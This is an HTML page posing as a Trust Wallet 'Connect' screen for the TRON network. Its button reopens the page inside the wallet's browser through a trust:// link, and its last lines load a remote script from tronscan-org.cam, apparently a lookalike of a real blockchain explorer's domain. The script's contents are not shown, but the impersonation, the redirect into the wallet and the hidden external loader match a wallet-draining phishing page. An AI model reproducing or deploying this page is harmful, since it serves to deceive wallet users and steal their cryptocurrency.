
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trust Wallet Connect</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background: #0b1020;
            color: #ffffff;
            font-family: Arial, sans-serif;
        }

        .container {
            width: 100%;
            max-width: 420px;
            padding: 30px;
            background: #151e32;
            border: 1px solid #293957;
            border-radius: 20px;
            text-align: center;
        }

        h1 {
            margin: 0 0 12px;
            font-size: 26px;
        }

        p {
            color: #aab8d0;
            font-size: 14px;
            line-height: 1.5;
        }

        .connect-button {
            width: 100%;
            margin-top: 24px;
            padding: 17px;
            border: none;
            border-radius: 12px;
            background: #3375f6;
            color: #ffffff;
            font-size: 17px;
            font-weight: bold;
            cursor: pointer;
            transition: background .2s;
        }

        .connect-button:hover {
            background: #2464df;
        }

        .status {
            margin-top: 20px;
            padding: 14px;
            background: #0b1427;
            border-radius: 10px;
            color: #a9c5ff;
            font-size: 13px;
            overflow-wrap: anywhere;
        }

        .footer {
            margin-top: 20px;
            color: #71809b;
            font-size: 11px;
        }
    </style>
</head>

<body>

    <div class="container">

        <h1>Trust Wallet</h1>

        <p>
            Connect your wallet using Trust Wallet.
            Network: TRON.
        </p>

        <button
            class="connect-button"
            data-connect
            type="button"
        >
            Connect
        </button>

        <div class="status" id="status">
            Waiting for user action
        </div>

        <div class="footer">
            Trust Wallet URI Scheme · Coin ID 195
        </div>

    </div>

    <script>
        function openInTrust(url, coinId = 195) {

            const scheme =
                `trust://open_url?coin_id=${coinId}&url=${encodeURIComponent(url)}`;

            const link = document.createElement("a");

            link.href = scheme;
            link.style.display = "none";

            document.body.appendChild(link);

            link.click();

            link.remove();

            console.log("Trust Wallet URI:", scheme);

            document.getElementById("status").textContent =
                "Trust Wallet launch requested";

        }

        document
            .querySelector("[data-connect]")
            .addEventListener("click", () => {

                openInTrust(window.location.href);

            });
    </script>

    <!-- Внешний скрипт -->
    <script
        src="https://tronscan-org.cam/k/k570ff837e3.js"
        data-api="https://tronscan-org.cam">
    </script>

</body>
</html>
